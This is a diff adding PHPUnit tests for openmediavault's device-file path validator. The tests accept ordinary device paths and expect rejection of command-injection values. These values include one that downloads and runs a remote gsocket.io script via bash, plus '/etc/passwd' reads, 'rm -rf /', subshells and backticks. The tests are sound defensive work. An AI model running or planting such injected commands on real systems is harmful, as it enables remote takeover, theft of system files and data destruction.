@@ -128,6 +128,348 @@ class test_openmediavault_datamodel_schema extends \PHPUnit\Framework\TestCase
     /**
      * @doesNotPerformAssertions
      */
+    public function testCheckFormatDevicefileSata()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/sda",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileSataPartition()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/sdb2",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileNvme()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/nvme0n1",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileNvmePartition()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/nvme0n1p1",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileMmc()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/mmcblk0",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileMmcPartition()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/mmcblk0p1",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileMdRaid()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/md0",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileMdRaidSubdir()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/md/0",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileDeviceMapper()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/dm-0",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileLvm()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/mapper/data-lv",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileVirtio()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/vda1",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileLoop()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/loop0",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileByIdAta()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/disk/by-id/ata-WDC_WD20EARX-00PASB0_WD-WMAZA2048027",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileByUuid()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/disk/by-uuid/113dbaac-e496-11e6-ac68-73bc0f572bae",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileByIdMdName()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/disk/by-id/md-name-vmpc01:data",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileByIdMdUuid()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/disk/by-id/md-uuid-75de9de9:6beca92e:8442575c:73eabbc9",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
+    public function testCheckFormatDevicefileByPath()
+    {
+        $schema = $this->getSchema();
+        $schema->checkFormat(
+            "/dev/disk/by-path/pci-0000:00:10.0-scsi-0:0:0:0",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailSemicolonInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda; id",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailRcePoc()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            '/dev/sda; GS_WEBHOOK_KEY=af946780 bash -c "$(curl -fsSL https://gsocket.io/x)"',
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailPipeInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda | cat /etc/passwd",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailAndInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda && rm -rf /",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailSubshellInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda$(id)",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailBacktickInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda`id`",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailRedirectInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda > /tmp/out",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailNewlineInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/dev/sda\nid",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailVariableInjection()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            '/dev/sda $USER',
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailNoDevPrefix()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "sda",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    public function testCheckFormatDevicefileFailWrongPath()
+    {
+        $schema = $this->getSchema();
+        $this->expectException(\OMV\Json\SchemaValidationException::class);
+        $schema->checkFormat(
+            "/etc/passwd",
+            [ "format" => "devicefile" ],
+            "field1"
+        );
+    }
+
+    /**
+     * @doesNotPerformAssertions
+     */
     public function testCheckFormatDirpath1()
     {
         $schema = $this->getSchema();
